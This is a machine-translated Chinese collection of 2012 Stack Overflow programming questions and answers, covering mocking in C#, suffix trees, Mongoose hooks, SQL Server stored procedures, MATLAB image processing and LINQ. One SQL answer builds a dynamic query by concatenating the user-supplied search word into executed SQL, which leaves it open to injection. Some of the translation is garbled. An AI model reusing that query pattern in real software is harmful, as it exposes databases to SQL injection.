mock.Expect(m => m.Beeping()).Return(true);
var isBeepInTime = BeepInTime(mock, timeSpan) 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-07T13:26:50.790

有很多不同的方法可以解决这个问题。最简单的方法是将 Beep 的接口传递给类（通过构造函数或方法本身）。

```
public Boolean BeepInTime(Interfaces.IDateTime time,TimeSpan beepTime, Interfaces.IBeep beep) 
{ 
    var h = time.GetTime(); 
    if (h == beepTime) 
    { 
        return beep.Beeping(); 
    } 
    else 
    { 
        return false; 
    } 
   } 
```

在您的单元测试中，您创建一个模拟 IBeep 对象并传入模拟。那里也有很多第三方模拟框架，因此您不必创建自己的模拟。我个人使用最小起订量，这是一个很好的。RhinoMocks 也很受欢迎。两者都是免费的。

如果您不想在生产代码中创建 Beep 类，那么您可以这样做...

```
public Boolean BeepInTime(Interfaces.IDateTime time,TimeSpan beepTime, Interfaces.IBeep beep = null) 
{ 
    if (beep == null)
         beep = new Beep();

    var h = time.GetTime(); 
    if (h == beepTime) 
    { 
        return beep.Beeping(); 
    } 
    else 
    { 
        return false; 
    } 
   } 
```

注意：我通常不会将接口传递给构造函数并将其分配给字段，而是将其传递给方法，特别是如果从许多方法调用该类时）。还有许多其他方法可以做到这一点，包括使用 NInject。我只是提供这些示例，让您先了解一下它是如何完成的。

我建议在决定使用任何一种方法之前，先在互联网上进行几天的研究，调查这些事情。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-07T13:31:48.330

您首先需要`Beep`从`BeepInTime`方法中删除依赖项，如下所示：

```
public Boolean BeepInTime(Interfaces.IDateTime time,TimeSpan beepTime, Interfaces.IBeep beep)
       {           
           var h = time.GetTime();
           if (h == beepTime)
           {

               return beep.Beeping();
           }
           else
           {
               return false;
           }

       } 
```

然后，您可以在使用 Moq 之类的东西进行测试时模拟 IBeep impementation：

```
//Arrange
var mockBeep = new Mock<Interfaces.IBeep>();
mockBeep.Setup(b => b.Beeping())
.Returns(true);

// Act

var result = myClass.BeepInTime(myTime, myBeepTime, mockBeep.Object);

... 
```

# algorithm - 从文本中提取所有出现的重复和独特模式以及上下文

> ID：12318950
> 
> 赞同：4
> 
> 时间：2012-09-07T13:20:56.310
> 
> 标签：algorithm, pattern-matching, design-patterns, suffix-tree

假设我有文本“abcabx”。我想知道有一个重复的模式“ab”，它出现的所有位置，以及这些重复的上下文如何与它的其他出现相关。我还希望数据结构具有区分和隔离的独特模式“c”和“x”。我已经设置了一个后缀树来尝试这样做，它看起来像这样（[来自this SO answer](https://stackoverflow.com/questions/9452701/ukkonens-suffix-tree-algorithm-in-plain-english)）：

![abcabx](../Images/8f5c7b645e1d25f8109782a6c35df990.png)

这确实告诉我模式“ab”出现了两次，一次带有后缀“cabx”，另一次带有“x”。但是，根处的“ab”仅指向模式的第一次出现。它的叶子“cabx”中还嵌入了另一个“ab”，当我希望那个“ab”（在“cabx”中）以某种方式被确认为数据结构中的重复时。我知道根“ab”的“x”叶代表它，但我需要知道，在“ab”的“cabx”叶中，那里有一个“ab”。另外，两个独特的图案“c”和“x”是该边缘的一部分。加上它们在那个边缘的位置，以及它们的“主要定义”（根边缘？）之间的交叉引用。

更简单地说，数据结构需要清楚地说明“这是所有独特的模式”，“这是所有重复的模式以及它们发生的每个地方”，以及“这是关联所有这些事物的上下文” .

所以我想我正在为后缀树寻找一个类似图形的元素，它将划分出已知的模式并将它们明确地关联起来。在此过程中，将记录独特的模式。但是我还是想要后缀树的上下文特征，比如说“c”（不是“cabx”，而是“c”）和“x”都在“ab”之后，“abx”在“abc”之后，什么跟在他们之后（在更大的情况下）等等。是否有后缀树的改编可以做到这一点，或者可能是另一种算法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-07T14:02:42.440

后缀树基本上只是以一种便于搜索子字符串的方式存储字符串的所有后缀。每个重复多次的子串将对应一个非终端节点。找到模式出现的上下文相对容易——如果你计算每个分支中的符号数量，它会给你从序列末尾开始的子字符串的偏移量，例如，有两个分支`ab`，长度为 1 和长度为 4 之一，因此您知道该模式从字符串末尾开始出现 3 和 6 个符号，或者从开头开始出现 3 和 0。

# wpf - 约束子窗口

> ID：12318971
> 
> 赞同：0
> 
> 时间：2012-09-07T13:22:18.327
> 
> 标签：wpf

我正在编写一个 WPF 应用程序来控制工业过程。主窗口类产生子窗口，每个子窗口控制一个单独的设备。这些子窗口可以拖动但不能调整大小。

子窗口归父窗口所有，因此它们保持在顶部，但是这产生的问题是它们可以被拖到主窗口菜单的顶部，这在我的客户看来在美学上是不可接受的。

如果子窗口位于菜单下方，或者直接进入菜单并停止，则可以，但不能遮挡主菜单。我怎样才能做到这一点？可以在 WPF 中完成而不进入 Win32 和非托管代码吗？

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-07T16:51:42.653

您可以尝试在父窗口上设置 Topmost=True，并使其仅包含主菜单。所以，你基本上会有一个主菜单窗口和其他几个窗口。或者，如果您不能这样做，您可以创建一个主菜单窗口，其中 Topmost=True 作为您父级的子窗口，并在其中一个更改位置时将它们一起移动。

# javascript - 预保存钩子：猫鼬中的回调顺序如何

> ID：12318972
> 
> 赞同：0
> 
> 时间：2012-09-07T13:22:23.007
> 
> 标签：javascript, node.js, asynchronous, mongoose

我想在我的预保存回调中增加一个计数器。我发现这个 stackoverflow 非常有用： [Mongoose 是否支持 Mongodb `findAndModify` 方法？](https://stackoverflow.com/questions/7334390/has-mongoose-support-findandmodify-mongodb-method)

我想做的是使用 findAndModify 方法。但是当我实现静态时，我的回调顺序并不像预期的那样。我总是预先保存然后执行 findAndModify 但我想在预保存挂钩的开始和结束之间执行 findAndModify。如果我定义一个带有回调的通用方法，它会按预期工作。

也与预保存钩子的 done 参数一起工作，没有任何不同的结果

我在这里想念什么

我的代码如下所示：

```
var mongoose = require('mongoose');
var should = require('should');

mongoose.connect("localhost","test_db");

var CommentSchema = new mongoose.Schema({
  content:    {type:String},
  created_at: {type:Date, default:Date.now},
  _post:{type:mongoose.Schema.ObjectId,ref:'Post'}

});

var PostSchema = new mongoose.Schema({
  title:    {type:String},
  content:  {type:String},
  comments: [{type:mongoose.Schema.ObjectId, ref:'Comment'}],
  counter: {type:Number}

    });

PostSchema.statics.findAndModify= function(query,sort,doc,options,callback){
  return this.collection.findAndModify(query,sort,doc,options,callback);
 }

PostSchema.statics.test_me = function(clb){
   console.log("test_me");
   clb();
}
CommentSchema.pre('save',function(next,done){
  console.log("enter pre save comment");
  if(this.isNew){
   Post.findAndModify({_id:this._post},[],{$inc:{count:1}},{new:true},function(err,post){
    console.log("enter find-and-modify!");
    console.log(post);
   });
  Post.test_me(function(){
    console.log("callback of test_me");
  });
  console.log("exit pre save comment");

    next();
  }
});

var Post = mongoose.model('Post',PostSchema);
var Comment = mongoose.model('Comment',CommentSchema);

var post = new Post({title:"hello world"});
var comment = new Comment({content:"1st comment",_post:post});
post.comments.push(comment);

  var id = post.id;
  console.log(id);
  post.save(function(err){
    comment.save(function(err){
        Post.find({_id:id })
          .populate('comments')
          .exec(function(err,result){
          console.log("--------------- result -----------------");
          console.log(result);
          });
    });
  }); 
```

这是我的命令行的结果：

```
5049f0d2e21547430a000001
enter pre save comment
test_me
callback of test_me
exit pre save comment
enter find-and-modify!
{ __v: 0,
  _id: 5049f0d2e21547430a000001,
  comments: [ 5049f0d2e21547430a000002 ],
  count: 1,
  title: 'hello world' }
--------------- result -----------------
[ { __v: 0,
    _id: 5049f0d2e21547430a000001,
    count: 1,
    title: 'hello world',
    comments: 
     [ { content: '1st comment',
         _post: 5049f0d2e21547430a000001,
         _id: 5049f0d2e21547430a000002,
         __v: 0,
         created_at: Fri Sep 07 2012 15:04:18 GMT+0200 (CEST) } ] } ] 
```

编辑：我不想知道如何用 test_me 按顺序执行 findAndModify。我想知道为什么 findAndMody 在预保存完成后进入。即使它是嵌入式的，也应该像 test_me 方法所展示的那样工作。所以 test_me 方法应该说明异步方法应该嵌套工作......但 findAndModify 不......就像我的命令行输出显示的那样......它总是在预保存退出后进入 findAndModify 即使我使用 done()打回来...

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-07T19:41:20.900

由于我们正在处理异步，它将运行

```
console.log("enter pre save comment");
if(this.isNew){
  Post.findAndModify({_id:this._post},[],{$inc:{count:1}},{new:true},function(err,post){
    console.log("enter find-and-modify!");
    console.log(post);
  });
  Post.test_me(function(){
    console.log("callback of test_me");
  });
  console.log("exit pre save comment");
  next();
} 
```

一个接一个，而不是等待它执行或响应，然后再继续下一个。由于 Post.findAndModify() 需要更长的时间来执行，所以回调函数中的任何内容都将在回调函数之外的任何内容之后执行。

如果您希望它按顺序执行更多

```
console.log("enter pre save comment");
if(this.isNew){
  Post.findAndModify({_id:this._post},[],{$inc:{count:1}},{new:true},function(err,post){
    console.log("enter find-and-modify!");
    console.log(post);
    Post.test_me(function(){
      console.log("callback of test_me");
      console.log("exit pre save comment");
      next();
    });
  });     
} 
```

# c# - 在 Compact Framework 上的 BackgroundWorker 实现

> ID：12318973
> 
> 赞同：2
> 
> 时间：2012-09-07T13:22:31.633
> 
> 标签：c#, .net, multithreading, compact-framework, opennetcf

我正在查看 .NET 紧凑框架的 OpenNETCF SDF BackgroundWorker 实现中的代码，看起来下面的代码不是线程安全的。但是智能设备框架已经存在了很长时间，所以我错过了什么？这是线程安全的吗？如果是，为什么？

请注意，我不倾向于发布整个课程，因为即使 SDF 可以免费使用，但期望客户为 SDF 的许可证付费。如果任何 SDF 团队甚至反对这个教育摘录，那么我会立即提出这个问题。

这是将方法调用出列以在 UI 线程上调用它们的后台线程：

```
private void ProgressDispatcherProc()
{
    this.m_stopThreads = false;
    while (!this.m_stopThreads)
    {
        while (this.m_progressQueue.Count > 0)
        {
            MethodInvoker method = null;
            ProgressChangedEventArgs args = this.m_progressQueue.Dequeue();
            if (this.ProgressChanged != null)
            {
                if (method == null)
                {
                    method = () => this.ProgressChanged(this, args);
                }
                this.m_guiMarshaller.BeginInvoke(method);
                Application.DoEvents();
            }
        }
        Thread.Sleep(this.WorkerReportsProgress ? 5 : 0x3e8);
    }
} 
```

该变量`m_progressQueue`是标准 System.Collections.Generic.Queue<>。

我担心的是没有锁定来保护队列，它在一个线程中排队并在这个线程中出队。我假设在一个简单的布尔值上循环`while (!this.m_stopThreads)`是足够安全的，因为据我了解，在 .NET Compact Framework 中，所有变量访问都被视为 volatile。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-07T13:31:36.237

我同意它应该有一个锁，至少在`Dequeue`调用周围，像这样：

```
lock(m_progressQueue.SyncRoot)
{
    ProgressChangedEventArgs args = this.m_progressQueue.Dequeue(); 
} 
```

它可能会在课堂的其余部分使用它们。

# maven-3 - 带有依赖项的声纳和 MAVEN POM 文件

> ID：12318975
> 
> 赞同：0
> 
> 时间：2012-09-07T13:22:31.617
> 
> 标签：maven-3, maven-plugin, sonarqube, maven-assembly-plugin

我已经设置了 Maven 和 Sonar 来分析 .NET 项目，它适用于 winforms 项目。但是，当我添加一个 MVC 项目时，它会生成失败，因为它找不到 System.Web.MVC.dll 文件。我有一个作为声纳的一部分运行的 Fx-Cop 插件。解决这个问题的一种方法是打包 dll，将 local=true 复制到项目中。但是我不想这样做（打包MVC文件有什么问题吗？）

*如何向 MVC dll 添加依赖项？*我按照[这个例子](http://incubator.apache.org/npanday/docs/1.4.0-incubating/guide/vs/references.html)添加它是这样的：

```
<dependencies>
  <dependency>
    <groupId>artifact_group_id</groupId>
    <artifactId>System.WEb.MVC</artifactId>
    <version>4.0.30319</version>
    <type>library</type>
    <scope>system</scope>
    <systemPath>C:\DOTNET\DLLS\System.Web.Mvc.dll</systemPath>
  </dependency>   
</dependencies> 
```

*我仍然得到由 FX-Cop 引起的构建失败*。查看 FX-Cop 日志，我收到如下消息：

> 读取模块“MyTestMvcApp”时遇到以下错误：无法解析程序集引用：System.Web.Mvc，Version=3.0.0.0，Culture=neutral，PublicKeyToken=31bf3856ad364e35。

我正在使用 apache-maven-3.0.2 和 sonar-3.2。有人能帮忙吗？

这是完整的 POM.XML 文件

```
 <project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd">

  <modelVersion>4.0.0</modelVersion>
  <groupId>Test</groupId>
  <artifactId>Sonar.For.NET.Test</artifactId>
  <version>1.0</version>
  <name>Testing </name>
  <packaging>netpack</packaging>

  <properties>
    <visual.studio.solution>TestProjectsForSonarBuild.sln</visual.studio.solution>
    <visual.test.project.pattern>*.Tests;*Test</visual.test.project.pattern>
    <dotnet.tool.version>4.0</dotnet.tool.version>
    <sonar.language>cs</sonar.language>
  </properties>

  <dependencies>
    <dependency>
     <groupId>artifact_group_id</groupId>
     <artifactId>System.WEb.MVC</artifactId>
     <version>4.0.30319</version>
     <type>library</type>
     <scope>system</scope>
     <systemPath>C:\DOTNET\DLLS\System.Web.Mvc.dll</systemPath>
    </dependency>
  </dependencies> 

  <build>
    <plugins>
      <plugin>
        <groupId>org.codehaus.sonar-plugins.dotnet</groupId>
        <artifactId>maven-dotnet-plugin</artifactId>
        <version>0.6</version>
        <extensions>true</extensions>
      </plugin>
      <plugin>
        <groupId>org.codehaus.mojo</groupId>
        <artifactId>sonar-maven-plugin</artifactId>
        <configuration>
                <toolVersion>3.5</toolVersion>
                <buildConfigurations>Debug</buildConfigurations>
                <rebuild>true</rebuild>
            <language>cs</language>
        </configuration>
      </plugin>
    </plugins>
  </build>
</project> 
```

谢谢你的时间。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-10T09:26:06.733

您可以使用“sonar.fxcop.assemblyDependencyDirectories”属性，如[FxCop 插件的文档页面中所述](http://docs.codehaus.org/display/SONAR/sonar-csharp-fxcop-plugin)。

所以你有两个解决方案：

*   您的构建过程将“System.Web.MVC.dll”复制到临时文件夹中，您可以通过此属性引用该文件夹

*   或者您直接引用可以找到此 DLL 的绝对路径（但您的属性可能无法在不同的环境/服务器上移植）

# wordpress - Wordpress，短代码不适用于我制作的自定义主题

> ID：12318979
> 
> 赞同：1
> 
> 时间：2012-09-07T13:22:42.647
> 
> 标签：wordpress, wordpress-theming

我已经开始学习如何为 wordpress 制作自定义主题，并且在安装具有短代码的插件时遇到问题。我尝试通过创建一个页面并使用可视化/html 编辑器添加一个简码（通常是一个表单插件，我尝试了两个不同的插件，还有一个 ecwid 购物车，但没有简码起作用，是的，插件已激活）。当我检查页面时，它没有显示任何内容。这是我的single.php ..

```
<?php get_header(); ?>
  <body>
  <div id="maintopwrapper">
    <div class="container" id="topwrapper">
<div class="row">
<div class="span8">

 <?php while (have_posts()) : the_post(); ?>
<!-- Content Here -->

<div class="row"><div class="span8 greygrad round">
<div class="padding"><div class="content" style="margin-top:25px;"><?php the_content(); ?></div></div></div></div>

<div class="row margintop"><div class="span8 greygrad round">
<div class="padding">

<?php comments_template() ?>
</div></div></div>

<?php endwhile;?> 

</div>
<?php get_sidebar(); ?>

</div>
    </div>

    </div> <!-- end of maintop wrapper-->

<?php get_footer(); ?> 
```

它应该显示，因为 the_content() 在那里对吗？让我知道您是否需要我分享其他内容。插件我尝试了重力形式、ecwid 购物车和 quforms..所有这些短代码都不起作用。我让其中一个工作的唯一方法是创建一个自定义页面主题并添加硬编码的 php 来调用该函数，但我宁愿让短代码工作，因此该主题可供不编码的人使用。

对于现场示例： http: [//modernlogic.co/wp](http://modernlogic.co/wp)

菜单中的“联系人”页面实际上是在自定义主题中硬编码的，它没有使用我在菜单中的“示例页面”中想要的简码

提前致谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-07T17:35:51.827

我是个白痴...我意识到我没有page.php，所以当我尝试将短代码添加到页面时，它引用了index.php而不是page.php（因为没有），所以它只显示摘录而不是内容。我想出了这一点，因为我尝试将简码添加到帖子中，所以当它转到 single.php 时，简码​​有效，因为它有内容而不仅仅是摘录。哦，好吧，我猜是反复试验.. 无论如何，感谢您尝试帮助我

# ruby - ruby *args 语法错误

> ID：12318980
> 
> 赞同：3
> 
> 时间：2012-09-07T13:22:44.497
> 
> 标签：ruby, syntax-error, args

我发现了我想了解的这种奇怪之处。如果我在 pry 中定义这两种方法...

```
def test(*args)
   puts args
end
def test=(*args)
    puts args
end 
```

它们都可以工作。但是如果我将上面的代码放在一个模块中并将该模块包含在另一个类（例如 Job 类）中，则以下内容

```
j=Job.last
j.test=(1,2,3) 
```

引发以下错误...

```
SyntaxError: (irb):3: syntax error, unexpected ',', expecting ')'
j.test=(1,2,3)
          ^ 
```

以下工作按预期...

```
j.test=[1,2,3]
j.test=(1) 
```

因此，看起来在模块内部，使用“=”定义的方法总是需要一个 arg。这对我来说没有意义。

我错过了什么

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-07T13:28:48.440

Ruby 解释器的解析。尝试

```
j.send :test=, 1, 2, 3 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-07T13:29:44.337

直接使用

```
j.test = 1,2,3 
```

或者

```
j.test= ([1,2,3]) 
```

或`

```
j.send('test=',[1,2,3]) 
```

# haskell - 在 Haskell 中打印 NominalDiffTime

> ID：12318985
> 
> 赞同：3
> 
> 时间：2012-09-07T13:23:01.767
> 
> 标签：haskell, type-conversion

我的 Haskell 程序中有这样一段代码：

```
...
start <- getCurrentTime
...
end <- getCurrentTime
...
delta = end `diffUTCTime` start
... 
```

在此之后，`delta`有类型`NominalDiffTime`。正如文档中所写，这种类型继承自`Num`，我想用小数点后的 3 个（例如）位打印它。但是，使用类似的东西`printf "%.3f" delta`不起作用：`No instance for (PrintfArg NominalDiffTime)`.

如何正确执行此操作？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-07T13:38:26.387

如果您想要一个格式良好的差异时间，您可以`System.Time.Utils (renderSecs)`与`round`

```
 ghci> import Data.Time.Clock
 ghci> import System.Time.Utils (renderSecs)
 ghci> 
 ghci> let renderS = renderSecs . round :: NominalDiffTime -> String
 ghci> t1 <- getCurrentTime
 ghci> -- wait a little :-P
 ghci> t2 <- getCurrentTime
 ghci> renderS $ t2 `diffUTCTime` t1
 "2m15s" 
```

它还将天作为 d，将小时作为 h。请注意，类型签名对于 ghci 是强制性的，否则它将默认为`Double`，并且突然之间您无法为其提供`NominalDiffTime`值。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-09-07T13:28:23.713

您可以将其转换为以`PrintfArg`所需格式打印的类型，例如

```
printf "%.3f" (realToFrac delta :: Double) 
```

可以。

# sql - 在存储过程中将字段名称作为参数传递

> ID：12318986
> 
> 赞同：0
> 
> 时间：2012-09-07T13:23:01.603
> 
> 标签：sql, sql-server-2008, stored-procedures

![我的搜索框](../Images/43e6789d85146e8b0e5ae0d2bf9f9873.png)

我想在选定的组合框项目（数据库中的字段）中搜索单词（文本框），我的存储过程是：

```
USE [QueueDB]
GO
/****** Object:  StoredProcedure [dbo].[SP_SelectDriver_ByNameAndField]    Script Date: 09/07/2012 17:20:24 ******/
SET ANSI_NULLS ON
GO
SET QUOTED_IDENTIFIER ON
GO
ALTER PROCEDURE [dbo].[SP_SelectDriver_ByNameAndField]
@Word nvarchar(100),
@Field nvarchar(100)
AS
BEGIN
select * from Driver where @Field like + N'%' + @Word + '%'
END 
```

它不起作用，你建议用什么方法来做这个搜索方法？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-07T13:25:04.220

您不能在 SQL 中使用动态列名。

为了实现你想要的，你需要使用[动态 SQL](http://www.sommarskog.se/dynamic_sql.html)。链接的文章对此主题进行了全面的讨论。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-07T13:28:05.677

阿齐兹德尔，

ComboBox hamishe baiangare LookUp ast ke hamanande Table eist ke 2 sotoune Id va Describer darad。Agar gharar ast ke meghdare entekhabie ComboBox be StoredProcedure ferestade beshe, pishnahad mikonam az Id e Bind shode be SelectedValue e ComboBox estefade beshe。Nvarchar ro be SP ferestadan kare dorosti nist。

尊敬的先生/女士，

ComboBox 始终是信息系统中 LookUp 的替代品，就像只有两列 Id 和 Describer 的表。如果您要将 ComboBox 的 SelectedValue 发送到您的 StoredProcedure，我建议将 SelectedValue 的绑定值作为整数发送给它。然后你有很多选项来编写你的查询。使用 Nvarchar 发送 LookUp 值可能会对您的应用程序的未来产生许多副作用（相比之下，排序规则有很多问题）。

干杯

将代码更改为此：

```
USE [QueueDB]
GO
/****** Object:  StoredProcedure [dbo].[SP_SelectDriver_ByNameAndField]    Script Date: 09/07/2012 17:20:24 ******/
SET ANSI_NULLS ON
GO
SET QUOTED_IDENTIFIER ON
GO

ALTER PROCEDURE [dbo].[SP_SelectDriver_ByNameAndField]  (
    @Word   Nvarchar(100)
,   @Field  TinyInt
)   As  Begin

    Select *
        From    Driver
        Where   Case    When    @Field      =   1
                And Column1     Like + N'%' + @Word + '%'
                Then    1
                When    @Field      =   2
                And Column2     Like + N'%' + @Word + '%'
                Then    1
                When    @Field      =   3
                And Column3     Like + N'%' + @Word + '%'
                Then    1
                Else    0
            End =   1
    ;

    Return  0;

END 
```

您也可以使用另一种方式：

```
USE [QueueDB]
GO
ALTER PROCEDURE [dbo].[SP_SelectDriver_ByNameAndField]  (
    @Word   Nvarchar(100)
,   @Field  TinyInt
)   As  Begin

    Declare @Command    Nvarchar(Max);

    Select  @Command    =   N'
    Select *
        From    Driver
        Where   '
    +   Case    When    @Field      =   1
                Then    'Column1'
                When    @Field      =   2
                Then    'Column2'
                When    @Field      =   3
                Then    'Column3'
                Else    'DefaultColumn'
            End
    +   N'  Like + N''%'
    +   @Word
    +   N'%'''
    ;

    Execute (@Command);

    Return  0;

END 
```

# ruby-on-rails - 祖先：从范围中跳过元素

> ID：12318989
> 
> 赞同：0
> 
> 时间：2012-09-07T13:23:13.850
> 
> 标签：ruby-on-rails, activerecord, ancestry

使用宝石血统。

如何从 Category::ActiveRecordRelation 中跳过 self 元素或需要使用范围？

```
= simple_form_for @category do |f|
  = f.input :parent_id, collection: Category.roots 
```

就像是：

```
= f.input :parent_id, collection: Category.roots.except(@category) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-07T13:28:49.920

```
= f.input :parent_id, collection: Category.roots.where("id <> ?", @category.id) 
```

**或通过范围**

类别.rb

```
scope :except, lambda{ |category| where("id <> ?", category.id) } 
```

然后

```
= f.input :parent_id, collection: Category.roots.except(@category) 
```

# matlab - 从连接的组件制作检查器的有效方法

> ID：12318990
> 
> 赞同：2
> 
> 时间：2012-09-07T13:23:15.107
> 
> 标签：matlab, image-processing, octave

我有几个连接组件的二进制图像，有些大，有些小（可能只有 1 个像素）。有了这个，我正在寻找一种方法，以一种有效的方式将每个连接的组件变成一个跳棋模式，而不是连接的 blob。

到目前为止，我已经想出了两种可以尝试的方法，但它们要么会产生错误，要么效率很低：

1.  我知道整个图像，可以制作一个棋盘格图案蒙版来去除 50% 的像素。这是非常快的，但平均会删除 50% 的连接组件，这些组件的面积只有一个像素。

2.  在 MATLAB/Octave 中使用`bwlabel()`，并循环遍历每个连接的组件，仅当掩码超过 1 个像素时才将掩码应用于该组件（同时在循环到达时考虑其他组件）。这可能非常低效。

任何可以使用的智能/内置解决方案？

![例子](../Images/20ff5dc12801d15905eb901f5bf0f963.png)

生成图形的代码

```
T = zeros(40,40);
T(10:30,10:30) = 1;

chessVec = repmat([1;0],20,1);

T_wanted = (repmat([chessVec circshift(chessVec,1)],1,20).*T);

figure();
subplot(1,2,1);imshow(T);title('Start shape')
subplot(1,2,2);imshow(T_wanted);title('Wanted shape'); 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-07T13:57:29.853

没有什么比一揽子检查更能提高效率了。然后，您需要做的就是添加回小的连接组件。

```
%# create a test image
img = rand(100)>0.8;
img = imclose(img,ones(5));
img = imerode(img,strel('disk',2)); 
```

![在此处输入图像描述](../Images/0e77836120cb15c27b8960efa8b9105f.png)

```
%# get connected components
%# use 4-connect to preserve
%# the diagonal single-pixel lines later
cc = bwconncomp(img,4)

%# create checkerboard using one of Matlab's special matrix functions
chk = invhilb(100,100) < 0;

%# checker original image, add back small stuff
img(chk) = 0;

smallIdx = cellfun(@(x)x<2,cc.PixelIdxList);
img([cc.PixelIdxList{smallIdx}]) = 1; 
```

![在此处输入图像描述](../Images/073547084337a00d3fd8fb8e6a77afb0.png)

# .net - 使用 linq 编译的查询

> ID：12318995
> 
> 赞同：0
> 
> 时间：2012-09-07T13:23:27.810
> 
> 标签：.net, sql, vb.net, linq

嗨，我刚刚发现我的 Web 应用程序很慢，可能是因为 linq。

我对那些编译的查询有点迷茫，你能帮我编译一个查询并让它仍然可以用来查询查询吗？（这可以理解吗？：p）例如这个查询（在 vb.net 中）：

```
 Dim query = (From p In db.ProductCategories _
               Group Join t In db.Translate_ProductCategories On p.ID_Category Equals t.Category_ID Into res = Group From r1 In res.DefaultIfEmpty _
               Where r1.Language_ID = langID And p.CategoryActive = True _
               Select New With {.name = r1.Name, .idcat = p.ID_Category, .level = p.CategoryLevel, .index = p.CategoryIndex, .parentID = p.CategoryParent_ID}) 
```

然后我想确保仍然能够做这样的事情：

```
Dim level0 = (From l In query Where l.level = 0 Order By l.index Ascending Select l) 
```

谢谢您的帮助

编辑：

我试着这样做：

```
Dim myquery = CompiledQuery.Compile( _
    Function(db As EshopDataContext) _
      (From p In db.ProductCategories _
               Group Join t In db.Translate_ProductCategories On p.ID_Category Equals t.Category_ID Into res = Group From r1 In res.DefaultIfEmpty _
               Where r1.Language_ID = langID And p.CategoryActive = True _
               Select New With {.name = r1.Name, .idcat = p.ID_Category, .level = p.CategoryLevel, .index = p.CategoryIndex, .parentID = p.CategoryParent_ID}))

Dim query = myquery.Invoke(db)

Dim level0 = (From l In query Where l.level = 0 Order By l.index Ascending Select l) 
```

我有错误“查询结果不能被枚举多次。” 在这条线上

```
cptCat1 = level1.Where(Function(l1) l1.parentID = parentId1).Count 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-07T14:34:52.597

首先阅读：http: [//www.codinghorror.com/blog/2010/03/compiled-or-bust.html](http://www.codinghorror.com/blog/2010/03/compiled-or-bust.html)

如果您真的认为在阅读后必须这样做，这里是 MS 的关于已编译查询的 How-To。

[http://msdn.microsoft.com/en-us/library/bb399335.aspx#Y0](http://msdn.microsoft.com/en-us/library/bb399335.aspx#Y0)（用于 linq2sql）

[http://msdn.microsoft.com/en-us/library/bb896297.aspx#Y300](http://msdn.microsoft.com/en-us/library/bb896297.aspx#Y300)（用于 linq2EF）